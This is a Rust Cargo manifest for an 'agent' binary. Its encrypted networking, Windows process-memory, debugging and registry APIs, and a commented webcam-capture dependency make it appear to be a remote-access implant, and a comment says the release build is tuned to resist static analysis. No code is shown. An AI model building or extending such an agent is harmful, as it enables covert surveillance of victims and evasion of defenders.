[package]
name = "mythos-agent"
version = "1.0.0"
edition = "2021"

[[bin]]
name = "agent"
path = "src/main.rs"

[dependencies]
reqwest = { version = "0.11", features = ["blocking", "json", "rustls-tls"], default-features = false }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
aes-gcm = "0.10"
p256 = { version = "0.13", features = ["ecdh"] }
hkdf = "0.12"
sha2 = "0.10"
rand = "0.8"
base64 = "0.21"
uuid = { version = "1.6", features = ["v4"] }
libc = "0.2"
windows-sys = { version = "0.48", features = ["Win32_Foundation", "Win32_System_Threading", "Win32_System_Memory", "Win32_System_Diagnostics_Debug", "Win32_System_Diagnostics_ToolHelp", "Win32_Security", "Win32_System_Kernel", "Win32_System_Registry"] }
# Crate windows pour COM + WMF + WIC (webcam capture)
windows = { version = "0.48.0", features = [
    "Win32_Foundation",
    "Win32_System_Com",
    "Win32_Media_MediaFoundation",
    "Win32_Graphics_Imaging",
    "Win32_System_Com_StructuredStorage",
    "Win32_UI_Shell",
] }

[profile.release]
# Binaire minimal et optimisé — difficile à analyser statiquement
opt-level = 3
strip = true          # Supprime les symboles de debug
lto = true            # Link-Time Optimization
codegen-units = 1
panic = "abort"       # Pas de stack unwinding (plus petit)
